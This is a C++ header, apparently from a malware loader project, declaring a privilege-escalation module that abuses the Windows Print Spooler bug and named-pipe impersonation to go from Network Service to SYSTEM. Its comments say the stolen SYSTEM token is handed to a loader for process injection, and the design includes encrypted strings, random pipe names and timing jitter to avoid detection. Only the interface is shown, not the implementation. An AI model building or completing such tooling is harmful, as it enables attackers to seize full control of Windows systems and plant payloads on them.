#pragma once

#include <windows.h>
#include <vector>
#include <string>
#include <cstdint>

class easCipher42;

/**
 * SeImpersonateHandler
 *
 * Handles the Print Spooler bug exploitation for privilege escalation from
 * unprivileged context (Network Service) to SYSTEM via named pipe impersonation.
 *
 * DESIGN: This module is ONLY responsible for:
 *  1. Named pipe creation and management
 *  2. Token impersonation and verification
 *  3. Process spawning with stolen SYSTEM token
 *
 * The payload delivery is handled by ProcessInjection (already in loader).
 * This keeps concerns separated and the module focused.
 *
 * Usage:
 *   SeImpersonateHandler impersonator(true);  // verbose=true
 *   DWORD systemPid = 0;
 *   if (impersonator.Execute(systemPid)) {
 *       // systemPid now holds PID of process running as SYSTEM
 *       // Inject into it using ProcessInjection class
 *   }
 */
class SeImpersonateHandler {
private:
    // Named pipe handles
    HANDLE hNamedPipe = INVALID_HANDLE_VALUE;
    HANDLE hPipeEvent = INVALID_HANDLE_VALUE;
    HANDLE hTriggerThread = INVALID_HANDLE_VALUE;

    // Cipher reference for decrypting strings
    easCipher42& cipher;

    // Configuration
    std::string pipeName;
    bool verbose = false;
    DWORD waitTimeoutMs = 30000;  // 25s default + 5s jitter = max 30s

    // Helper to get random jitter (±5s around base timeout)
    DWORD GetTimeoutWithJitter();

    // Helper methods - named pipe setup
    bool GenerateRandomPipeName(std::string& outName);
    bool CreatePipeServer(const std::string& pipeName);
    bool WaitForPipeConnection(DWORD timeoutMs);

    // Helper methods - impersonation & token handling
    bool ImpersonateAndGetToken(HANDLE hPipe, HANDLE& hOutToken);
    bool DuplicateTokenToPrimary(HANDLE hImpersonationToken, HANDLE& hOutPrimaryToken);

    // Helper methods - process spawning
    bool SpawnProcessWithToken(HANDLE hSystemToken, DWORD& outProcessId);

    // Helper methods - RPC trigger
    bool TriggerPrinterBugInternal(const std::string& pipeName);
    bool TriggerPrinterBugExternal(const std::string& pipeName);

public:
    SeImpersonateHandler(easCipher42& cipher_ref, bool verboseMode = false);
    ~SeImpersonateHandler();

    // Main public interface
    // Execute the escalation chain: pipe -> wait -> impersonate -> return SYSTEM token
    // Returns HANDLE to primary SYSTEM token for caller to use (loader does the injection)
    // If pipeName is provided, use it instead of generating random one
    bool Execute(HANDLE& outSystemToken, const std::string& customPipeName = "");

    // Configuration setters
    void SetVerbose(bool v) { verbose = v; }
    void SetWaitTimeout(DWORD ms) { waitTimeoutMs = ms; }

    // Getters for debugging
    const std::string& GetPipeName() const { return pipeName; }
    HANDLE GetPipeHandle() const { return hNamedPipe; }
};

/**
 * Utility function prototypes (defined in seimpersonate.cpp)
 * These can be used independently if needed
 */

// Convert bytes to hex string for logging
std::string BytesToHex(const uint8_t* data, size_t len);

// Get the SID of a token (for verification)
bool GetTokenSID(HANDLE hToken, std::wstring& outSID);
